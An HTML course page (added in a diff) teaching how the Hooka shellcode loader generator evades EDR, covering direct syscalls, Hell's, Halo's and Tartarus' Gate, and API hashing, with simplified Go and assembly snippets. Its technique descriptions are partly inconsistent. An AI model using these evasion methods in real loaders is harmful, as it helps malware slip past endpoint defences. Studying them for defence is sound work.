@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 3: Syscalls &amp; Gate Techniques - Hooka Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1FA9D;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#4ade80;--accent2:#2dd4bf;--gradient:linear-gradient(135deg,#4ade80,#2dd4bf)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Hooka Course</h2>
+<span>Shellcode Loader Generator</span>
+</div>
+<a class="home-link" href="../Hooka_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Intro to Shellcode Loaders</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Injection Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link active" href="module3.html"><span>3. Syscalls &amp; Gate Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Unhooking &amp; Patching</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Sandbox &amp; Process Protection</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Encryption &amp; Obfuscation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. The Hooka Go Library</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. CLI Generator &amp; Full Chain</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 3: Syscalls &amp; Gate Techniques</h1>
+<p class="subtitle">If the front door is monitored, go through the wall.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>This module explains why direct syscalls are essential for EDR evasion, how Windows transitions from user mode to kernel mode, and how Hooka implements three generations of dynamic syscall resolution: <strong>Hell's Gate</strong>, <strong>Halo's Gate</strong>, and <strong>Tartarus' Gate</strong>. You will also learn about API hashing and how Hooka uses it to avoid exposing plaintext API names in generated loaders.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Why Syscalls Matter</h2>
+
+<p>When your code calls a Windows API function like <code>NtAllocateVirtualMemory</code>, the call normally goes through <strong>ntdll.dll</strong> &mdash; the lowest user-mode layer before entering the kernel. EDR products know this, so they <strong>hook ntdll functions</strong> by replacing the first few bytes of each function with a <code>JMP</code> instruction that redirects execution to the EDR's inspection code.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Normal API Call vs EDR-Hooked Call</h4>
+<div class="flow">
+<div class="flow box">Your Code</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">kernel32.dll<br><small>VirtualAlloc</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">ntdll.dll<br><small>NtAllocateVirtualMemory</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">syscall<br><small>Kernel mode</small></div>
+</div>
+<div class="flow" style="margin-top:8px">
+<div class="flow box">Your Code</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">ntdll.dll<br><small>JMP &rarr; EDR hook</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">EDR Inspector<br><small>Log + analyze</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Original code<br><small>Continues to kernel</small></div>
+</div>
+</div>
+
+<p>The solution: <strong>skip ntdll entirely</strong>. If your code can construct the correct syscall instruction with the right System Service Number (SSN), you can transition directly to kernel mode without ever touching the hooked ntdll functions. The EDR never sees the call.</p>
+
+<div class="card">
+<h4>Direct Syscalls in One Sentence</h4>
+<p>A direct syscall places the correct SSN in the <code>EAX</code> register and executes the <code>syscall</code> instruction directly from your own code, completely bypassing ntdll.dll and any hooks it contains.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. Windows Syscall Architecture</h2>
+
+<p>When a user-mode program needs kernel services (allocating memory, creating threads, opening files), it must transition from <strong>Ring 3</strong> (user mode) to <strong>Ring 0</strong> (kernel mode). On x64 Windows, this happens through the <code>syscall</code> CPU instruction.</p>
+
+<p>Every NT function in ntdll.dll follows the same <strong>stub pattern</strong>:</p>
+
+<pre><span class="lang-tag">ASM</span>; Standard NT syscall stub (unhooked)
+NtAllocateVirtualMemory:
+    mov r10, rcx            ; 4C 8B D1  (save 1st arg)
+    mov eax, 0x0018         ; B8 18 00 00 00  (SSN in EAX)
+    test byte ptr [...]     ; Check for SystemCall flag
+    jne  label
+    syscall                 ; Transition to kernel
+    ret                     ; Return to caller</pre>
+
+<p>The critical bytes are:</p>
+
+<table>
+<tr><th>Bytes</th><th>Instruction</th><th>Purpose</th></tr>
+<tr><td><code>4C 8B D1</code></td><td><code>mov r10, rcx</code></td><td>Saves the first argument (Windows calling convention requirement)</td></tr>
+<tr><td><code>B8 XX XX 00 00</code></td><td><code>mov eax, SSN</code></td><td>Loads the System Service Number into EAX</td></tr>
+<tr><td><code>0F 05</code></td><td><code>syscall</code></td><td>Triggers the ring transition to kernel mode</td></tr>
+</table>
+
+<div class="card warn">
+<h4>SSNs Change Per Windows Build</h4>
+<p>System Service Numbers are <strong>not stable</strong> across Windows versions. The SSN for <code>NtAllocateVirtualMemory</code> might be <code>0x0018</code> on Windows 10 21H2 but <code>0x0019</code> on Windows 11 23H2. Hardcoding SSNs means your loader breaks on different Windows versions. This is why dynamic resolution techniques (Hell's Gate, Halo's Gate) are essential.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Hooka's Direct Syscall Implementation</h2>
+
+<p>Hooka provides two core functions for direct syscall execution:</p>
+
+<h3>GetSysId &mdash; Runtime SSN Resolution</h3>
+
+<p><code>GetSysId(funcname string)</code> reads the syscall stub of the specified ntdll function at runtime and extracts the SSN from the <code>mov eax</code> instruction:</p>
+
+<pre><span class="lang-tag">Go</span>// GetSysId resolves the SSN for an NT function at runtime
+func GetSysId(funcname string) (uint16, error) {
+    // Get handle to ntdll.dll (already loaded in every process)
+    ntdll := GetModuleHandle("ntdll.dll")
+
+    // Get address of the target function
+    funcAddr := GetProcAddress(ntdll, funcname)
+
+    // Read the stub bytes
+    stub := (*[8]byte)(unsafe.Pointer(funcAddr))
+
+    // Verify the stub starts with: mov r10, rcx (4C 8B D1)
+    if stub[0] == 0x4c && stub[1] == 0x8b && stub[2] == 0xd1 {
+        // Extract SSN from: mov eax, XX XX (B8 at offset 3)
+        if stub[3] == 0xb8 {
+            ssn := uint16(stub[4]) | uint16(stub[5])<<8
+            return ssn, nil
+        }
+    }
+
+    return 0, fmt.Errorf("function %s appears to be hooked", funcname)
+}</pre>
+
+<h3>Syscall &mdash; Direct Execution</h3>
+
+<p><code>Syscall(callid uint16, args ...uintptr)</code> takes the SSN and arguments, and executes the syscall instruction directly from assembly, completely bypassing ntdll:</p>
+
+<pre><span class="lang-tag">Go</span>// Using Hooka's direct syscall
+ssn, err := hooka.GetSysId("NtAllocateVirtualMemory")
+if err != nil {
+    log.Fatal("Function is hooked:", err)
+}
+
+// Execute direct syscall with the resolved SSN
+status, err := hooka.Syscall(
+    ssn,
+    currentProcess,    // ProcessHandle
+    &baseAddr,         // BaseAddress
+    0,                 // ZeroBits
+    &regionSize,       // RegionSize
+    MEM_COMMIT|MEM_RESERVE,  // AllocationType
+    PAGE_READWRITE,    // Protect
+)</pre>
+
+<div class="card green">
+<h4>The Problem with GetSysId</h4>
+<p><code>GetSysId</code> works perfectly when the ntdll stub is <strong>not hooked</strong>. It reads the first bytes, finds the <code>mov r10, rcx</code> pattern, and extracts the SSN. But if an EDR has replaced those bytes with a <code>JMP</code> instruction (opcode <code>0xE9</code>), the expected pattern is gone and <code>GetSysId</code> fails. This is where the Gate techniques come in.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Hell's Gate</h2>
+
+<p><strong>Hell's Gate</strong>, created by <strong>am0nsec</strong> and <strong>smelly__vx</strong>, was the first published technique for dynamically resolving SSNs at runtime. The core insight: since SSNs are sequential in ntdll's export table, you can determine a function's SSN by its position relative to other NT functions.</p>
+
+<p>Hell's Gate enumerates all exported functions from ntdll.dll, identifies NT syscall stubs by their byte pattern, and sorts them by address. The SSN equals the function's index in this sorted list (SSN 0 for the first, SSN 1 for the second, and so on).</p>
+
+<pre><span class="lang-tag">Go</span>// Hell's Gate concept (simplified)
+func HellsGate(targetFunc string) (uint16, error) {
+    // 1. Parse ntdll exports
+    exports := parseNtdllExports()
+
+    // 2. Filter to only Zw* functions (they share stubs with Nt*)
+    var syscallFuncs []ExportEntry
+    for _, exp := range exports {
+        if strings.HasPrefix(exp.Name, "Zw") {
+            syscallFuncs = append(syscallFuncs, exp)
+        }
+    }
+
+    // 3. Sort by address (SSNs are assigned in address order)
+    sort.Slice(syscallFuncs, func(i, j int) bool {
+        return syscallFuncs[i].Address < syscallFuncs[j].Address
+    })
+
+    // 4. Find target - its index IS the SSN
+    target := strings.Replace(targetFunc, "Nt", "Zw", 1)
+    for i, fn := range syscallFuncs {
+        if fn.Name == target {
+            return uint16(i), nil
+        }
+    }
+    return 0, fmt.Errorf("function not found")
+}</pre>
+
+<div class="card">
+<h4>Limitation of Hell's Gate</h4>
+<p>Hell's Gate requires reading the syscall stub bytes to confirm a function is a valid syscall. If the stub is hooked (first bytes replaced with <code>JMP</code>), Hell's Gate cannot reliably verify the function. This led to the development of Halo's Gate.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Halo's Gate</h2>
+
+<p><strong>Halo's Gate</strong> extends Hell's Gate with a critical improvement: when a function's stub is hooked, it looks at <strong>neighboring functions</strong> (which may not be hooked) to calculate the SSN.</p>
+
+<p>The key insight: if the function at index N is hooked but the function at index N+1 (or N-1) is not, you can read the neighbor's SSN and add or subtract 1 to derive the hooked function's SSN.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Halo's Gate: Neighbor-Based Resolution</h4>
+<div class="flow">
+<div class="flow box">Target Function<br><small>HOOKED (0xE9 JMP)</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Check Neighbor +1<br><small>Read stub bytes</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Neighbor SSN = X<br><small>Clean stub found</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Target SSN = X - 1<br><small>Calculate from offset</small></div>
+</div>
+</div>
+
+<pre><span class="lang-tag">Go</span>// Halo's Gate: detecting hooks and using neighbors
+func HalosGate(funcName string) (uint16, error) {
+    funcAddr := GetProcAddress(ntdll, funcName)
+    stub := readBytes(funcAddr, 8)
+
+    // Check if function is hooked (starts with JMP = 0xE9)
+    if stub[0] == 0xE9 || stub[3] == 0xE9 {
+        // Function is hooked! Search neighbors
+        for offset := 1; offset < 500; offset++ {
+            // Try the function UP (higher address)
+            upAddr := funcAddr + uintptr(offset * STUB_SIZE)
+            upStub := readBytes(upAddr, 8)
+            if isCleanStub(upStub) {
+                neighborSSN := extractSSN(upStub)
+                return neighborSSN - uint16(offset), nil
+            }
+
+            // Try the function DOWN (lower address)
+            downAddr := funcAddr - uintptr(offset * STUB_SIZE)
+            downStub := readBytes(downAddr, 8)
+            if isCleanStub(downStub) {
+                neighborSSN := extractSSN(downStub)
+                return neighborSSN + uint16(offset), nil
+            }
+        }
+    }
+
+    // Not hooked - read SSN directly
+    return extractSSN(stub), nil
+}
+
+func isCleanStub(stub []byte) bool {
+    // mov r10, rcx (4C 8B D1) + mov eax, SSN (B8 ...)
+    return stub[0] == 0x4c && stub[1] == 0x8b &&
+           stub[2] == 0xd1 && stub[3] == 0xb8
+}</pre>
+
+<!-- ============================================================ -->
+<h2>6. Tartarus' Gate</h2>
+
+<p><strong>Tartarus' Gate</strong> handles a subtler form of hooking. Some EDRs place their <code>JMP</code> hook <strong>after</strong> the <code>mov r10, rcx</code> instruction rather than at the very start. This means the first 3 bytes look clean, but the <code>mov eax, SSN</code> instruction at offset 3 is replaced.</p>
+
+<pre><span class="lang-tag">ASM</span>; Standard clean stub
+NtFunction:
+    4C 8B D1          ; mov r10, rcx    (clean)
+    B8 18 00 00 00    ; mov eax, 0x18   (SSN)
+    ...
+
+; Tartarus-style hook (JMP placed after mov r10, rcx)
+NtFunction:
+    4C 8B D1          ; mov r10, rcx    (looks clean!)
+    E9 XX XX XX XX    ; jmp EDR_hook    (hook AFTER first instruction)
+    ...</pre>
+
+<p>Tartarus' Gate detects this by checking <strong>both</strong> the function start (offset 0) and the instruction at offset 3. If either location contains a <code>JMP</code> (0xE9), the function is considered hooked and the neighbor-search algorithm activates:</p>
+
+<pre><span class="lang-tag">Go</span>// Tartarus' Gate: extended hook detection
+func isHooked(stub []byte) bool {
+    // Hell's Gate check: JMP at very start
+    if stub[0] == 0xE9 {
+        return true
+    }
+    // Tartarus' Gate check: JMP after mov r10, rcx
+    if stub[3] == 0xE9 {
+        return true
+    }
+    return false
+}</pre>
+
+<!-- ============================================================ -->
+<h2>7. Gate Technique Comparison</h2>
+
+<table>
+<tr><th>Technique</th><th>Authors</th><th>Hook Detection</th><th>Resolution Strategy</th><th>Weakness</th></tr>
+<tr><td><strong>Hell's Gate</strong></td><td>am0nsec, smelly__vx</td><td>Checks stub byte pattern</td><td>Export table sorting + index = SSN</td><td>Fails if target stub is hooked</td></tr>
+<tr><td><strong>Halo's Gate</strong></td><td>sektor7</td><td>JMP (0xE9) at function start</td><td>Reads neighbor stubs, calculates SSN from offset</td><td>Misses hooks placed after mov r10, rcx</td></tr>
+<tr><td><strong>Tartarus' Gate</strong></td><td>trickster0</td><td>JMP at offset 0 OR offset 3</td><td>Neighbor search (same as Halo's Gate)</td><td>May miss exotic hook placements</td></tr>
+</table>
+
+<div class="card highlight">
+<h4>Which Gate Does Hooka Use?</h4>
+<p>Hooka implements all three and exposes them through its library. The CLI defaults to Halo's Gate when the <code>--hashing</code> flag is used (since it pairs with API hashing). For library usage, you can call <code>GetSysIdHalos()</code> or <code>GetSysIdHashHalos(hash, hashFunc)</code> directly, choosing the technique that best fits your target environment.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. API Hashing</h2>
+
+<p>A loader that contains plaintext strings like <code>"NtAllocateVirtualMemory"</code> or <code>"NtCreateThreadEx"</code> in its binary is trivially identified by static analysis. <strong>API hashing</strong> replaces these strings with their hash values, resolving functions at runtime by hashing each export name and comparing.</p>
+
+<h3>How GetFuncPtr Works</h3>
+
+<p>Hooka's <code>GetFuncPtr(hash, hashingFunc)</code> walks the export table of a DLL, hashes each function name using the specified algorithm, and returns the address when a match is found:</p>
+
+<pre><span class="lang-tag">Go</span>// Resolve function by hash instead of name
+func GetFuncPtr(targetHash string, hashFunc func(string)string) uintptr {
+    ntdll := GetModuleHandle("ntdll.dll")
+    exports := parseExportTable(ntdll)
+
+    for _, export := range exports {
+        if hashFunc(export.Name) == targetHash {
+            return export.Address
+        }
+    }
+    return 0
+}
+
+// Usage: resolve NtAllocateVirtualMemory by its SHA256 hash
+addr := GetFuncPtr(
+    "a1b2c3d4e5f6...",  // pre-computed hash
+    hooka.SHA256Hash,
+)</pre>
+
+<h3>Supported Hashing Algorithms</h3>
+
+<table>
+<tr><th>Algorithm</th><th>Hooka Function</th><th>Hash Length</th><th>Notes</th></tr>
+<tr><td>MD5</td><td><code>MD5Hash(name)</code></td><td>32 hex chars</td><td>Fast, compact, but collision-prone</td></tr>
+<tr><td>SHA1</td><td><code>SHA1Hash(name)</code></td><td>40 hex chars</td><td>Good balance of speed and uniqueness</td></tr>
+<tr><td>SHA256</td><td><code>SHA256Hash(name)</code></td><td>64 hex chars</td><td>Most secure, largest hashes</td></tr>
+</table>
+
+<h3>Combining Hashing with Halo's Gate</h3>
+
+<p><code>GetSysIdHashHalos(hash, hashingFunc)</code> combines API hashing with Halo's Gate resolution. It finds the function by hash (no plaintext name), then applies Halo's Gate to extract the SSN even if the function is hooked:</p>
+
+<pre><span class="lang-tag">Go</span>// Maximum evasion: hash-based resolution + Halo's Gate
+ssn, err := hooka.GetSysIdHashHalos(
+    "a1b2c3...",         // SHA256 of "NtAllocateVirtualMemory"
+    hooka.SHA256Hash,    // hashing function
+)
+// Now use ssn with Syscall() for direct kernel transition</pre>
+
+<div class="card green">
+<h4>The --hashing CLI Flag</h4>
+<p>When you pass <code>--hashing</code> to the Hooka CLI, the generated loader uses API hashing for all function resolution. Instead of <code>GetProcAddress(ntdll, "NtAllocateVirtualMemory")</code>, the generated code contains hash constants and resolves functions by walking the export table at runtime. This eliminates suspicious strings from the binary, defeating static analysis tools that search for known API names.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>9. Hooked vs Unhooked Stub Comparison</h2>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Syscall Stub: Clean vs Hooked</h4>
+<div style="display:flex;gap:30px;justify-content:center;flex-wrap:wrap">
+<div style="flex:1;min-width:280px">
+<p style="text-align:center;font-weight:700;margin-bottom:10px;color:var(--green)">Clean (Unhooked)</p>
+<pre><span class="lang-tag">ASM</span>NtAllocateVirtualMemory:
+  4C 8B D1        mov r10, rcx
+  B8 18 00 00 00  mov eax, 0x18
+  0F 05           syscall
+  C3              ret</pre>
+</div>
+<div style="flex:1;min-width:280px">
+<p style="text-align:center;font-weight:700;margin-bottom:10px;color:var(--red)">Hooked (EDR Inline Hook)</p>
+<pre><span class="lang-tag">ASM</span>NtAllocateVirtualMemory:
+  E9 XX XX XX XX  jmp EDR_Hook
+  00 00 00        (overwritten bytes)
+  0F 05           syscall
+  C3              ret</pre>
+</div>
+</div>
+</div>
+
+<p>When <code>GetSysId()</code> reads the first byte and finds <code>0xE9</code> instead of <code>0x4C</code>, it knows the function is hooked. Halo's Gate then searches neighboring stubs (up and down in memory) for a clean one, reads that neighbor's SSN, and calculates the target SSN from the offset between them.</p>
+
+<!-- ============================================================ -->
+<h2>10. Putting It All Together</h2>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Complete Syscall Evasion Flow</h4>
+<div class="flow">
+<div class="flow box">Resolve by Hash<br><small>GetFuncPtr(hash, SHA256)</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Check for Hook<br><small>Is 0xE9 at offset 0 or 3?</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Gate Resolution<br><small>Halo/Tartarus neighbor search</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Direct Syscall<br><small>Syscall(ssn, args...)</small></div>
+</div>
+</div>
+
+<p>This chain provides <strong>three layers of evasion</strong>: (1) no plaintext API names in the binary, (2) hook detection and bypass via Gate techniques, and (3) direct kernel transition that never touches ntdll code. Even if the EDR has hooked every function in ntdll.dll, this chain resolves the correct SSN and makes the syscall without ever executing the hooked code.</p>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: Why do EDRs hook ntdll.dll functions?</p>
+<div class="quiz-btn" data-choice="A">A) To speed up API calls by caching results</div>
+<div class="quiz-btn" data-choice="B">B) To intercept and inspect sensitive API calls before they reach the kernel</div>
+<div class="quiz-btn" data-choice="C">C) To prevent applications from crashing</div>
+<div class="quiz-btn" data-choice="D">D) To provide backwards compatibility with older Windows versions</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: What improvement does Halo's Gate provide over Hell's Gate?</p>
+<div class="quiz-btn" data-choice="A">A) It uses faster hashing algorithms</div>
+<div class="quiz-btn" data-choice="B">B) It works without ntdll being loaded</div>
+<div class="quiz-btn" data-choice="C">C) It can resolve SSNs even when the target function is hooked by reading neighbor stubs</div>
+<div class="quiz-btn" data-choice="D">D) It supports 32-bit Windows systems</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: What is the purpose of API hashing in a shellcode loader?</p>
+<div class="quiz-btn" data-choice="A">A) To eliminate plaintext API name strings from the binary, defeating static analysis</div>
+<div class="quiz-btn" data-choice="B">B) To encrypt the shellcode payload</div>
+<div class="quiz-btn" data-choice="C">C) To compress the final executable size</div>
+<div class="quiz-btn" data-choice="D">D) To verify the integrity of Windows DLLs</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module2.html">&larr; Previous: Injection Techniques</a>
+<a class="primary" href="module4.html">Next: Unhooking &amp; Patching &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
